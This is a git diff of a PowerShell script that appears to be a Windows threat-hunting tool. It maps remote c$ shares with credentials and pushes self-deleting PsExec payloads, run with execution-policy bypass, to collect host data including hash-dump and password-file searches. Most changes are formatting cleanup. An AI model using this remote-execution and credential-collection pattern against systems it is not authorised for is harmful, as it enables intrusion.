-					UniqueFilter | Add-Content $ResultsUniqFilt	
+					UniqueFilter | Add-Content $ResultsUniqFilt
 				}
-			}	
-		}			
+			}
+		}
         4{
-			$filter = Get-Content $KnownGood.StartUpProg -ReadCount 0| Where{$_}
-			
+			$filter = Get-Content $KnownGood.StartUpProg | Where{$_}
+
 			#Unique results
 			"Count,Command"|Add-Content $ResultsUnique
 			$data = ($Content|select -skip 1)|%{$_.split(",")[1]}
 			UniqueFilter | Add-Content $ResultsUnique
-			
+
 			#Filtered Results
 			if($filter)
 			{
 				"Host Name,Command,Description,Location,User"|Add-Content $ResultsFiltered
 				($Content|select -skip 1)|Select-String -NotMatch -SimpleMatch -Pattern $filter |Add-Content $ResultsFiltered
-				
+
 				#Unique filtered results
-				$data = (Get-Content $ResultsFiltered -ReadCount 0|select -skip 1)|%{$_.split(",")[1]}
+				$data = (Get-Content $ResultsFiltered |select -skip 1)|%{$_.split(",")[1]}
 				if($data)
 				{
 					"Count,Command"|Add-Content $ResultsUniqFilt
-					UniqueFilter | Add-Content $ResultsUniqFilt	
+					UniqueFilter | Add-Content $ResultsUniqFilt
 				}
-			}		
+			}
 		}
-			
+
         5{
-			$filter = Get-Content $KnownGood.SchedTasks -ReadCount 0| Where{$_}
-			
+			$filter = Get-Content $KnownGood.SchedTasks | Where{$_}
+
 			#Unique results
 			"Count,Command"|Add-Content $ResultsUnique
 			$data = ($Content|select -skip 1)|%{$_.split(",")[1]}
 			UniqueFilter | Add-Content $ResultsUnique
-			
+
 			#Filtered Results
 			if($filter)
 			{
 				"Host Name,Command,JobId,Name,Owner,Priority"|Add-Content $ResultsFiltered
 				($Content|select -skip 1)|Select-String -NotMatch -SimpleMatch -Pattern $filter |Add-Content $ResultsFiltered
-				
+
 				#Unique filtered results
-				$data = (Get-Content $ResultsFiltered -ReadCount 0|select -skip 1)|%{$_.split(",")[1]}
+				$data = (Get-Content $ResultsFiltered |select -skip 1)|%{$_.split(",")[1]}
 				if($data)
 				{
 					"Count,Command"|Add-Content $ResultsUniqFilt
-					UniqueFilter | Add-Content $ResultsUniqFilt	
+					UniqueFilter | Add-Content $ResultsUniqFilt
 				}
-			}	
-		}	
+			}
+		}
 		6{
-			$filter = Get-Content $KnownGood.RunningProcs -ReadCount 0| Where{$_}
-			
+			$filter = Get-Content $KnownGood.RunningProcs | Where{$_}
+
 			#Unique results
 			"Count,Executable,Path"|Add-Content $ResultsUnique
 			$data = ($Content|select -skip 1)|%{"$($_.split(",")[2]),$($_.split(",")[1])"}
 			UniqueFilter | Add-Content $ResultsUnique
-			
+
 			#Filtered Results
 			if($filter)
 			{
 				"Host Name,Executable Path,Name"|Add-Content $ResultsFiltered
 				($Content|select -skip 1)|Select-String -NotMatch -SimpleMatch -Pattern $filter |Add-Content $ResultsFiltered
-				
+
 				#Unique filtered results
-				$data = (Get-Content $ResultsFiltered -ReadCount 0|select -skip 1)|%{"$($_.split(",")[2]),$($_.split(",")[1])"}
+				$data = (Get-Content $ResultsFiltered |select -skip 1)|%{"$($_.split(",")[2]),$($_.split(",")[1])"}
 				if($data)
 				{
 					"Count,Executable,Path"|Add-Content $ResultsUniqFilt
-					UniqueFilter | Add-Content $ResultsUniqFilt	
+					UniqueFilter | Add-Content $ResultsUniqFilt
 				}
 			}
-		}		
+		}
         7{
-			$filter = Get-Content $KnownGood.Drivers -ReadCount 0| Where{$_}
-			
+			$filter = Get-Content $KnownGood.Drivers | Where{$_}
+
 			#Unique results
 			"Count,Driver Name"|Add-Content $ResultsUnique
 			$data = ($Content|select -skip 1)|%{$_.split(",")[3]}
 			UniqueFilter | Add-Content $ResultsUnique
-			
+
 			#Filtered Results
 			if($filter)
 			{
 				"Host Name,Description,DisplayName,Name,Started,State,Status"|Add-Content $ResultsFiltered
 				($Content|select -skip 1)|Select-String -NotMatch -SimpleMatch -Pattern $filter |Add-Content $ResultsFiltered
-				
+
 				#Unique filtered results
-				$data = (Get-Content $ResultsFiltered -ReadCount 0|select -skip 1)|%{$_.split(",")[3]}
+				$data = (Get-Content $ResultsFiltered |select -skip 1)|%{$_.split(",")[3]}
 				if($data)
 				{
 					"Count,Driver Name"|Add-Content $ResultsUniqFilt
-					UniqueFilter | Add-Content $ResultsUniqFilt	
+					UniqueFilter | Add-Content $ResultsUniqFilt
 				}
 			}
 		}
         8{
-			$filter = Get-Content $KnownGood.Services -ReadCount 0| Where{$_}
-			
+			$filter = Get-Content $KnownGood.Services | Where{$_}
+
 			#Unique results
 			"Count,Service Name"|Add-Content $ResultsUnique
 			$data = ($Content|select -skip 1)|%{$_.split(",")[1]}
 			UniqueFilter | Add-Content $ResultsUnique
-			
+
 			#Filtered Results
 			if($filter)
 			{
 				"Host Name,Name,StartMode,State,Status"|Add-Content $ResultsFiltered
 				($Content|select -skip 1)|Select-String -NotMatch -SimpleMatch -Pattern $filter |Add-Content $ResultsFiltered
-				
+
 				#Unique filtered results
 				$data = (Get-Content $ResultsFiltered|select -skip 1)|%{$_.split(",")[1]}
 				if($data)
 				{
 					"Count,Command"|Add-Content $ResultsUniqFilt
-					UniqueFilter | Add-Content $ResultsUniqFilt	
+					UniqueFilter | Add-Content $ResultsUniqFilt
 				}
 			}
 		}
 		10{
-			$filter = Get-Content $KnownGood.Software -ReadCount 0| Where{$_}
-			
+			$filter = Get-Content $KnownGood.Software | Where{$_}
+
 			#Unique results
 			"Count,Software Name"|Add-Content $ResultsUnique
 			$data = ($Content|select -skip 1)|%{$_.split(",")[3]}
 			UniqueFilter | Add-Content $ResultsUnique
-			
+
 			#Filtered Results
 			if($filter)
 			{
 				"Host Name,InstallDate,InstallLocation,Name,Vendor,Version"|Add-Content $ResultsFiltered
 				($Content|select -skip 1)|Select-String -NotMatch -SimpleMatch -Pattern $filter |Add-Content $ResultsFiltered
-				
+
 				#Unique filtered results
-				$data = (Get-Content $ResultsFiltered -ReadCount 0|select -skip 1)|%{$_.split(",")[3]}
+				$data = (Get-Content $ResultsFiltered |select -skip 1)|%{$_.split(",")[3]}
 				if($data)
 				{
 					"Count,Software Name"|Add-Content $ResultsUniqFilt
-					UniqueFilter | Add-Content $ResultsUniqFilt	
+					UniqueFilter | Add-Content $ResultsUniqFilt
 				}
 			}
 		}
 		16{
-			$filter = Get-Content $KnownGood.HotFix -ReadCount 0| Where{$_}
-			
+			$filter = Get-Content $KnownGood.HotFix | Where{$_}
+
 			"Count,HotFixID"|Add-Content $ResultsUnique
 			$data = ($Content|select -skip 1)|%{$_.split(",")[2]}
 			UniqueFilter | Add-Content $ResultsUnique
-			
+
 			#Filtered Results
 			if($filter)
 			{
 				"Host Name,OS Version Number,Missing Hot-Fix"|Add-Content $ResultsFiltered
-				
+
 				#Get hosts names from hot fix scan
 				$data = ($Content|select -skip 1)|%{$_.split(",")[0]}
-				
+
 				#for each host name find hot fixes that are NOT installed
 				UniqueFilter | %{
 					$HostName = $_.split(",")[1]
 					$HostVersion = $script:ActiveComputers|%{$_|select-String $HostName}
-					if($HostVersion) 
+					if($HostVersion)
 					{
 						$HostVersion = $HostVersion.tostring().split(",")[2]
 						$filter |where{$_}|%{
-						
+
 							#Version included in filter list should be major version (i.e. 6.1)
 							if($_.split(",").count -gt 1){
 								$FilterVer = $_.split(",")[0]
 								$FilterHotFix = $_.split(",")[1]
-								
+
 								#Make sure host OS version matches filter
 								if($HostVersion|Select-String $FilterVer) {
 									#Check to see that host does NOT match the HotFixID
@@ -2680,9 +2680,9 @@ Function FilterData
 									}
 								}
 							}
-							
+
 							#Filter item is only a hotfixID
-							else 
+							else
 							{
 								if (-not ($Content | Select-String $HostName | Select-String "$_"))
 								{
@@ -2699,7 +2699,7 @@ Function FilterData
 			if($data)
 			{
 				"Count,File Name"|Add-Content $ResultsUnique
-				UniqueFilter | Add-Content $ResultsUnique	
+				UniqueFilter | Add-Content $ResultsUnique
 			}
 		}
 		102{
@@ -2707,7 +2707,7 @@ Function FilterData
 			if($data)
 			{
 				"Count,File Name"|Add-Content $ResultsUnique
-				UniqueFilter | Add-Content $ResultsUnique	
+				UniqueFilter | Add-Content $ResultsUnique
 			}
 		}
 		103{
@@ -2715,7 +2715,7 @@ Function FilterData
 			if($data)
 			{
 				"Count,File Name"|Add-Content $ResultsUnique
-				UniqueFilter | Add-Content $ResultsUnique	
+				UniqueFilter | Add-Content $ResultsUnique
 			}
 		}
 		104{
@@ -2723,7 +2723,7 @@ Function FilterData
 			if($data)
 			{
 				"Count,File Name"|Add-Content $ResultsUnique
-				UniqueFilter | Add-Content $ResultsUnique	
+				UniqueFilter | Add-Content $ResultsUnique
 			}
 		}
 		105{
@@ -2731,19 +2731,19 @@ Function FilterData
 			if($data)
 			{
 				"Count,File Name,Path"|Add-Content $ResultsUnique
-				UniqueFilter | Add-Content $ResultsUnique	
+				UniqueFilter | Add-Content $ResultsUnique
 			}
 		}
 	}
-	
-	$ConvertFiles = $Errors, $ResultsUniqFilt, $ResultsFiltered, $ResultsUnique, $Results   
+
+	$ConvertFiles = $Errors, $ResultsUniqFilt, $ResultsFiltered, $ResultsUnique, $Results
 	ConvertFileFormat $ConvertFiles
 }
 
 Function Release-Ref
 {
 	param($ref)
-	
+
 	if($ref)
 	{
 		([System.Runtime.InteropServices.Marshal]::ReleaseComObject([System.__ComObject]$ref) -gt 0)
@@ -2755,7 +2755,7 @@ Function Release-Ref
 Function ConvertFileFormat
 {
 	param($FileNames, $ScannedHosts)
-	
+
 	#If CSV just move files.  No conversion required
 	if($OutputFormat -eq "csv")
 	{
@@ -2768,28 +2768,28 @@ Function ConvertFileFormat
 			Move-Item "$TEMP_DIR\$outfile" "$OUT_DIR\"
 			Write-Host -ForegroundColor Green "Data located at $OUT_DIR\$outfile
 		"
-		}		
-		
+		}
+
 		Return
 	}
-	
+
 	if(-not $ScannedHosts) #don't write converting file format when scanned hosts file is created
 	{
 		Write-Host -ForegroundColor Yellow "Converting file format"
 	}
-	
+
 	if (-not (Test-Path "$OUT_DIR\CSV")) #verify/create directory for converted CSV files
 	{
 		mkdir "$OUT_DIR\CSV" |Out-Null
 	}
-	
+
 	#Create a microsoft excel object and default to CSV on failure
 	try {
 		$excel = New-Object -ComObject Excel.Application -ErrorAction Stop
 	} catch {
 		Write-Host -ForegroundColor Red "Failed to create Excel object.  Defaulting to CSV"
 		$script:OutputFormat = "CSV"
-		
+
 		if($ScannedHosts)
 		{
 			Move-Item "$TEMP_DIR\Scanned_Hosts*csv" "$OUT_DIR\"
@@ -2799,37 +2799,37 @@ Function ConvertFileFormat
 			Move-Item "$TEMP_DIR\$outfile" "$OUT_DIR\"
 			Write-Host -ForegroundColor Green "Data located at $OUT_DIR\$outfile"
 		}
-		Return 
+		Return
 	}
-	
+
 	#set excel to invisible
 	$excel.Visible = $false
-	
+
 	#Add workbook
 	$workbook = $excel.workbooks.Add()
-    
+
 	#Remove other worksheets
     $workbook.worksheets.Item(2).delete()
-   
+
     #After the first worksheet is removed,the next one takes its place
     $workbook.worksheets.Item(2).delete()
 
 	$outputFile = $outfile.split(".")[0]
-	
+
 	$i=1
 	foreach ($CSV in $FileNames)
 	{
 		if(-not (Test-Path "$CSV")){continue}
 		$File = (Get-ChildItem $CSV).BaseName.split(".")[0]
-		
+
 		#If more than one file, create another worksheet for each file
         If ($i -gt 1) {
             $workbook.worksheets.Add() | Out-Null
         }
-		
+
         #Use the first worksheet in the workbook (also the newest created worksheet is always 1)
         $worksheet = $workbook.worksheets.Item(1)
-      
+
 		#Add name of CSV as worksheet name
 		if(-not ($outfile -match "DomainAccounts"))
 		{
@@ -2839,12 +2839,12 @@ Function ConvertFileFormat
 		{
 			$worksheet.name = $File
 		}
-        
+
 
         #Define the connection string and where the data is supposed to go
 		$TxtConnector = ("TEXT;" + (Get-Item $CSV).FullName)
 		$CellRef = $worksheet.Range("A1")
-		
+
 		#Build, use and remove the text file connector
 		$Connector = $worksheet.QueryTables.add($TxtConnector,$CellRef)
 		$worksheet.QueryTables.item($Connector.name).TextFileCommaDelimiter = $True
@@ -2854,7 +2854,7 @@ Function ConvertFileFormat
 
 		#Autofit the columns
 		$worksheet.UsedRange.EntireColumn.AutoFit() | out-null
-		
+
 		#Freeze first row
 		$workSheet.Activate();
 		$workSheet.Application.ActiveWindow.SplitRow = 1;
@@ -2862,13 +2862,13 @@ Function ConvertFileFormat
 
 		#Apply autofilter
 		$worksheet.usedrange.autofilter(1, [Type]::Missing) | Out-Null
-		
+
         $i++
 	}
-	
+
 	switch($OutputFormat)
 	{
-		#File Extension ".xlsb" --> XlFileFormat= 50 
+		#File Extension ".xlsb" --> XlFileFormat= 50
 		#File Extension".xlsx"  --> XlFileFormat= 51
 		#File Extension".xlsm"  --> XlFileFormat= 52
 		#File Extension".xls"   --> XlFileFormat= 56
@@ -2877,12 +2877,12 @@ Function ConvertFileFormat
 		#File Extension ".prn"  --> XlFileFormat= 36
 		#Link below shows all file format options
 		#https://msdn.microsoft.com/en-us/library/office/ff198017.aspx
-		
+
 		"xlsb"{
 			$workbook.SaveAs("$OUT_DIR\${outputFile}.xlsb",50)
 			$out = "$OUT_DIR\${outputFile}.xlsb"
 		}
-		"xlsx"{		
+		"xlsx"{
 			$workbook.SaveAs("$OUT_DIR\${outputFile}.xlsx",51)
 			$out = "$OUT_DIR\${outputFile}.xlsx"
 		}
@@ -2891,7 +2891,7 @@ Function ConvertFileFormat
 			$out = "$OUT_DIR\${outputFile}.xls"
 		}
 	}
-	
+
 	for($i=0; $i -lt 15; $i++) #move CSV data files to CSV folder
 	{
 		try {
@@ -2902,13 +2902,13 @@ Function ConvertFileFormat
 			sleep 1
 		}
 	}
-	
+
 	$excel.Quit()
-	
+
 	#Release processes for Excel
 	$a = Release-Ref($worksheet)
 	$a = Release-Ref($workbook)
-	
+
 	#remove temp directory files. keep looping until all processes unlock files
 	while($true){
 		try{
@@ -2916,7 +2916,7 @@ Function ConvertFileFormat
 			break
 		} catch {sleep 3}
 	}
-	
+
 	if(-not $ScannedHosts)
 	{
 		Write-Host -ForegroundColor Green "Data located at $out
@@ -2927,7 +2927,7 @@ Function ConvertFileFormat
 
 ############################################
 #	END Functions for Deploy/Multi-threading
-############################################ 
+############################################
 
 
 ############################################
@@ -2937,14 +2937,14 @@ Function ConvertFileFormat
 [ScriptBlock] $GetComputersSB = {
 
 	param($RHost, $scan)
-	
+
 	Function VerifyIP
 	{
 		param($IP)
-		
+
 		$Octets = $IP.split(".")
 		if($Octets.count -ne 4){Return $false}
-		
+
 		for($i=0; $i -lt 4; $i++)
 		{
 			if($Octets[$i] -match "[0-9]" -and $Octets[$i] -notmatch "[a-zA-Z]")
@@ -2978,25 +2978,25 @@ Function ConvertFileFormat
 			$Hostname = $Hostname.split(".")[0]
 		}
 	}
-	
+
 	if($Scan.DomainName)
 	{
 
 		$Search = New-Object DirectoryServices.DirectorySearcher([ADSI]"LDAP://$($scan.DomainName)")
 		$Search.filter = "(&(name=$Hostname)(objectClass=computer))"
 		$HostData = $Search.FindOne()
-		
+
 		if($HostData)
 		{
 			$HostData.GetDirectoryEntry()|%{
 				$name=$_.name
 				$os=$_.OperatingSystem
 				$ver=$_.OperatingSystemVersion
-				Return "$name,$os,$ver" | Select-String "Windows"	
+				Return "$name,$os,$ver" | Select-String "Windows"
 			}
 		}
 	}
-		
+
 	else #Don't use Active Directory.  Return IP
 	{
 		$HostIP = @(([System.Net.Dns]::GetHostEntry("$Hostname")).addresslist|%{
@@ -3021,26 +3021,26 @@ Function ConvertFileFormat
 	Function DeleteShare
 	{
 		param($IPAddress)
-		
+
 		if($scan.Creds)
 		{
 			net use \\$IPAddress\c$ /delete 2>&1|Out-Null
 		}
 	}
-	
+
 	Function MapDrive
 	{
 		param($IPAddress)
 		net use \\$IPAddress\c$ /user:$UserLogon $($scan.Creds.GetNetworkCredential().password) 2>&1|Out-Null
 		if(-not $?)
 		{
-			"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$IPAddress,Can't Map Drive" | 
+			"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$IPAddress,Can't Map Drive" |
 			Add-Content "$($scan.TEMP_DIR)\ErrorLog.csv"
 			Return $FALSE
 		}
 		Return $TRUE
 	}
-	
+
 	If($scan.creds)
 	{
 		$UserDomain = $scan.Creds.GetNetworkCredential().domain
@@ -3054,7 +3054,7 @@ Function ConvertFileFormat
 			$UserLogon = "$UserName"
 		}
 	}
-	
+
     $RHost | % {
         $Comp = $_.split(",")[0]
 		$OSCaption = $_.split(",")[1]
@@ -3071,19 +3071,19 @@ Function ConvertFileFormat
 				try {
 					if($scan.Creds)
 					{
-						$OS = Get-WmiObject -ComputerName $HostIP Win32_OperatingSystem -Credential $scan.Creds -ErrorAction Stop 
+						$OS = Get-WmiObject -ComputerName $HostIP Win32_OperatingSystem -Credential $scan.Creds -ErrorAction Stop
 					}
 					Else
 					{
 						$OS = Get-WmiObject -ComputerName $HostIP Win32_OperatingSystem -ErrorAction Stop
 					}
 				} Catch {
-					"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostIP,WMI failed" | 
+					"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostIP,WMI failed" |
 					Add-Content "$($scan.TEMP_DIR)\ErrorLog.csv"
 					DeleteShare $HostIP
 					Return
 				}
-				
+
 				$Comp = $OS.CSName
 				$OSCaption = $OS.caption.replace(',', '').replace('Microsoft ', '')
 				$Ver = $OS.version
@@ -3092,17 +3092,17 @@ Function ConvertFileFormat
 			}
 			else
 			{
-				"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostIP,Test-Path failed" | 
+				"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostIP,Test-Path failed" |
 				Add-Content "$($scan.TEMP_DIR)\ErrorLog.csv"
 				DeleteShare $HostIP
 				Return
-			} 
+			}
 		}
 		else{
 			$HostIP = ([System.Net.Dns]::GetHostEntry("$Comp")).addresslist|%{$_.IPAddressToString}
 			if(-not $HostIP)  #Host name cannot be resolved
 			{
-				"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostIP,Can't Resolve DNS" | 
+				"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostIP,Can't Resolve DNS" |
 				Add-Content "$($scan.TEMP_DIR)\ErrorLog.csv"
 				Return
 			}
@@ -3119,7 +3119,7 @@ Function ConvertFileFormat
         }
 		else
 		{
-			"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$Comp,Test-Path failed" | 
+			"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$Comp,Test-Path failed" |
 			Add-Content "$($scan.TEMP_DIR)\ErrorLog.csv"
 			DeleteShare $IPaddr
 			Return
@@ -3130,12 +3130,12 @@ Function ConvertFileFormat
 #scriptblock to execute psexec on remote hosts
 [ScriptBlock] $PSExec_SB = {
     param($RHost, $scan)
-	
+
 
     $HostName=$RHost.split(",")[0]
 	$HostIP=$RHost.split(",")[1]
     $ver=$RHost.split(",")[3]
-		
+
 	Function DeleteShare
 	{
 		if($scan.Creds)
@@ -3143,7 +3143,7 @@ Function ConvertFileFormat
 			net use \\$HostIP\c$ /delete |Out-Null
 		}
 	}
-	
+
     if($ver.split(".")[0] -ge 6) #powershell for vista+
 	{
 		$Rcode = "PSExecShellCode.ps1"
@@ -3151,7 +3151,7 @@ Function ConvertFileFormat
 		$PSexecArgs = 'echo . | powershell -ExecutionPolicy Bypass c:\PSExecShellCode.ps1'
 		$ps=$true
 	}
-    else 
+    else
 	{
 		$Rcode = "PSExecShellCode.bat"
 		$PSCode = $scan.BATCode
@@ -3160,11 +3160,11 @@ Function ConvertFileFormat
 		switch($scan.RemoteDataFile)
 		{
 			#Scans only available on win7+
-			"HashDump392125281" {Return} 
+			"HashDump392125281" {Return}
 			"FileHashes223711" {Return}
 		}
 	}
-	
+
 	if($scan.Creds)
 	{
 		$UserDomain = $scan.Creds.GetNetworkCredential().domain
@@ -3177,24 +3177,24 @@ Function ConvertFileFormat
 		{
 			$UserLogon = "$UserName"
 		}
-	
+
 		net use \\$HostIP\c$ /user:$UserLogon $($scan.Creds.GetNetworkCredential().password) 2>&1|Out-Null
 		if(-not $?){Return}
 	}
-	
+
     if (Test-Path "\\$HostIP\c$\$Rcode")
 	{
         Remove-Item -Path "\\$HostIP\c$\$Rcode" -Force
 	}
-	
+
     try{
 		$PSCode | Add-Content "\\$HostIP\c$\$Rcode" -ErrorAction Stop
     } catch {
         "$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostName,Copy failed" | Add-Content "$($scan.TEMP_DIR)\ErrorLog.csv"
 		DeleteShare
         Return
-    } 
-	
+    }
+
 
 	if($scan.Creds)
 	{
@@ -3229,7 +3229,7 @@ Function ConvertFileFormat
 		"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostName,Remote Execution failed" | Add-Content "$($scan.TEMP_DIR)\ErrorLog.csv"
 		Remove-Item -Path "\\$HostIP\c$\PSExecShellCode.*" -Force -ErrorAction SilentlyContinue
 		DeleteShare
-	} 
+	}
 }
 
 #Job to kill hung psexec processes after 15 seconds
@@ -3251,7 +3251,7 @@ Function ConvertFileFormat
 #script block to collect data file from remote hosts
 [ScriptBlock] $CollectFiles_SB = {
     param($RHost, $scan)
-	
+
 	Function DeleteShare
 	{
 		if($scan.Creds)
@@ -3259,11 +3259,11 @@ Function ConvertFileFormat
 			net use "\\$HostIP\c$" /delete |Out-Null
 		}
 	}
-	
+
     $HostName = $RHost.split(",")[0]
 	$HostIP = $RHost.split(",")[1]
     $ver=$RHost.split(",")[3]
-	
+
 	if($scan.Creds)
 	{
 		$UserDomain = $scan.Creds.GetNetworkCredential().domain
@@ -3276,35 +3276,35 @@ Function ConvertFileFormat
 		{
 			$UserLogon = "$UserName"
 		}
-	
+
 		net use \\$HostIP\c$ /user:$UserLogon $($scan.Creds.GetNetworkCredential().password) 2>&1|Out-Null
 		if(-not $?){Return}
 	}
-    
+
 	if($ver.split(".") -ge 6){$Rcode = "PSExecShellCode.ps1"}
     else {$Rcode = "PSExecShellCode.bat"}
-    
+
 	for($i=0; $i -lt $scan.TimeOut; $i++) #wait until scan finishes
     {
-        if (Test-Path "\\$HostIP\c$\$Rcode"){sleep 1} 
+        if (Test-Path "\\$HostIP\c$\$Rcode"){sleep 1}
         else {break}
     }
-	
+
 	#log scan time-out error
 	if($i -eq $scan.TimeOut){"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostName,Scan Timed-out"| Add-Content "$($scan.TEMP_DIR)\ErrorLog.csv"}
-   
+
     if (Test-Path  "\\$HostIP\c$\$($scan.RemoteDataFile)")
-    {   
+    {
 		$ErrorActionPreference_temp = $ErrorActionPreference
 		$ErrorActionPreference = "Stop"
         for($j=0; $j -lt $scan.TimeOut; $j++) #wait for file to unlock
         {
 			try {
-				
+
 				if($scan.RemoteDataFile -eq "hashes392125281")
 				{
 					$scan.mtx.waitone() |Out-Null
-					$scan.Data = ($scan.Data + (get-content "\\$HostIP\C$\$($scan.RemoteDataFile)" -ReadCount 0) | sort -Unique) 
+					$scan.Data = ($scan.Data + (get-content "\\$HostIP\C$\$($scan.RemoteDataFile)" -ReadCount 0) | sort -Unique)
 					$scan.mtx.ReleaseMutex()
 				}
 				else
@@ -3322,11 +3322,11 @@ Function ConvertFileFormat
         }
 		$ErrorActionPreference = $ErrorActionPreference_temp
     }
-	else 
+	else
 	{
 		"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostName,Absent Data-file"| Add-Content "$($scan.TEMP_DIR)\ErrorLog.csv"
 	}
-	
+
 	if($j -eq $scan.TimeOut)
 	{
 		"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostName,Collect Timed-out"| Add-Content "$($scan.TEMP_DIR)\ErrorLog.csv"
@@ -3352,9 +3352,9 @@ Function ConvertFileFormat
 
 [ScriptBlock] $PingSweepSB = {
 	param($RHost, $scan)
-	
+
 	$ping  = (Test-Connection $RHost -Count 1).ResponseTimeToLive
-	
+
 	if($ping)
 	{
 		$scan.mtx.waitone() |Out-Null
@@ -3371,8 +3371,8 @@ Function ConvertFileFormat
 
 	$ScriptFiles =
 	"PSExecShellCode.bat",
-	"PSExecShellCode.ps1"	
-	$DataFiles = 
+	"PSExecShellCode.ps1"
+	$DataFiles =
 	"UserExeSearch",
 	"USB_Enumeration",
 	"AutoRunDisable",
@@ -3395,7 +3395,7 @@ Function ConvertFileFormat
 	"PasswordFileSearch",
 	"hashes",
 	"HashDump"
-	
+
 	if($scan.Creds)
 	{
 		$UserDomain = $scan.Creds.GetNetworkCredential().domain
@@ -3408,7 +3408,7 @@ Function ConvertFileFormat
 		{
 			$UserLogon = "$UserName"
 		}
-	
+
 		net use \\$HostIP\c$ /user:$UserLogon $($scan.Creds.GetNetworkCredential().password) 2>&1|Out-Null
 		if(-not $?){Return}
 	}
@@ -3437,7 +3437,7 @@ Function ConvertFileFormat
 			}
 		}
 	}
-	
+
 	if($scan.creds)
 	{
 		net use \\$HostIP\c$ /delete 2>&1 | Out-Null
@@ -3457,7 +3457,7 @@ Function ConvertFileFormat
 ############################################
 #START Script Blocks for Deployable payloads
 ############################################
-$UserExeSearchCode_BAT1 = @'
+$UserExeSearchCode_BAT = @'
 @echo off
 IF EXIST "C:\UserExeSearch392125281" DEL "C:\UserExeSearch392125281"
 for /R "c:\documents and settings" %%f in (*.exe) do echo %COMPUTERNAME%,%%~nxf,%%~dpf >> "C:\UserExeSearch392125281"
@@ -3465,7 +3465,8 @@ for /R "c:\documents and settings" %%f in (*.exe) do echo %COMPUTERNAME%,%%~nxf,
 '@
 $UserExeSearchCode_PS1 = @'
 if (Test-Path "C:\UserExeSearch392125281"){Remove-Item -Force "C:\UserExeSearch392125281"}
-Get-ChildItem -Recurse -Force "c:\Users" -ErrorAction SilentlyContinue -Include *.exe -Exclude "Application Data" 2>$null | 
+Get-ChildItem -Recurse -Force "c:\Users" -ErrorAction SilentlyContinue -Include *.exe 2>$null |
+?{$_.FullName -NotMatch "Application Data"}|
 foreach {$env:COMPUTERNAME+","+$_.name+","+$_.Directoryname}|
 Out-file "C:\UserExeSearch392125281"
 Remove-Item -Force "C:\PSExecShellCode.ps1"
@@ -3489,7 +3490,7 @@ for /F "tokens=1-2* delims==" %%A in ('wmic startup get command^,user^,descripti
 		echo %COMPUTERNAME%,!Command!,!Description!,!Location!,!User! >> "C:\StartUpPrograms392125281"
 		set /a var=0
 	)
-) 
+)
 (goto) 2>nul & del "%~f0"
 '@
 $StartUpProgramsCode_PS1 = @'
@@ -3508,14 +3509,14 @@ Remove-Item -Force "C:\PSExecShellCode.ps1"
 $RunningProcsCode_BAT = @'
 @echo off
 IF EXIST "C:\RunningProcs392125281" DEL "C:\RunningProcs392125281"
-wmic process get name,executablepath /FORMAT:csv |findstr /v Node >> "C:\RunningProcs392125281"
+wmic process get name,executablepath,ProcessID /FORMAT:csv |findstr /v Node >> "C:\RunningProcs392125281"
 (goto) 2>nul & del "%~f0"
 '@
 $RunningProcsCode_PS1 = @'
 if (Test-Path "C:\RunningProcs392125281"){Remove-Item -Force "C:\RunningProcs392125281"}
 try{
 	Get-WmiObject Win32_process |
-	foreach {$env:COMPUTERNAME+","+$_.ExecutablePath+","+$_.Name}|
+	foreach {$env:COMPUTERNAME+","+$_.ExecutablePath+","+$_.Name+","+$_.ProcessID}|
 	Out-file "C:\RunningProcs392125281"
 } catch {
 	Remove-Item -Force "C:\PSExecShellCode.ps1"
@@ -3530,10 +3531,10 @@ IF EXIST "C:\Drivers392125281" DEL "C:\Drivers392125281"
 wmic sysdriver get DisplayName, Name, State, Status, Started, Description /format:csv |findstr /v Node >> "C:\Drivers392125281"
 (goto) 2>nul & del "%~f0"
 '@
-$QueryDriversCode_PS1 = @' 
+$QueryDriversCode_PS1 = @'
 if (Test-Path "C:\Drivers392125281"){Remove-Item -Force "C:\Drivers392125281"}
 try{
-	Get-WmiObject Win32_systemdriver | 
+	Get-WmiObject Win32_systemdriver |
 	foreach {$env:COMPUTERNAME+","+$_.Description+","+$_.DisplayName+","+$_.Name+","+$_.started+","+$_.state+","+$_.status}|
 	Out-file "C:\Drivers392125281"
 } catch {
@@ -3578,9 +3579,9 @@ for /F "tokens=1-7 delims=: " %%A in ('netstat -ano -p TCP ^|findstr TCP') do (
 $NetstatCode_PS1 = @'
 if (Test-Path "C:\Netstat392125281"){Remove-Item -Force "C:\Netstat392125281"}
 try{
-	(netstat -ano -p TCP | Select-String -Pattern '\s+(TCP)' | 
-	ForEach-Object {$env:COMPUTERNAME + ((($_ -replace '\s+', ',') -replace '\[::\]', '') -replace ':', ',')}) | 
-	%{ $_.Split(',')[0] +","+ $_.Split(',')[2] +","+ 
+	(netstat -ano -p TCP | Select-String -Pattern '\s+(TCP)' |
+	ForEach-Object {$env:COMPUTERNAME + ((($_ -replace '\s+', ',') -replace '\[::\]', '') -replace ':', ',')}) |
+	%{ $_.Split(',')[0] +","+ $_.Split(',')[2] +","+
 	$_.Split(',')[3] +","+ $_.Split(',')[4] +","+ $_.Split(',')[5] +","+
 	$_.Split(',')[6] +","+ $(Get-Process -Id $($_.Split(',')[7])).Name +","+ $_.Split(',')[7] }|
 	Out-file "C:\Netstat392125281"
@@ -3611,8 +3612,8 @@ for /F "tokens=1-2* delims==" %%A in ('wmic product get Name^, Vendor^, Version^
 		echo %COMPUTERNAME%,!InstallDate!,!InstallLocation!,!Name!,!Vendor!,!Version! >> "C:\InstalledSoftware392125281"
 		set /a var=0
 	)
-) 
-endlocal 
+)
+endlocal
 (goto) 2>nul & del "%~f0"
 '@
 $InstalledSoftwareCode_PS1 = @'
@@ -3711,6 +3712,7 @@ IF EXIST "C:\AutoRunDisable392125281" DEL "C:\AutoRunDisable392125281"
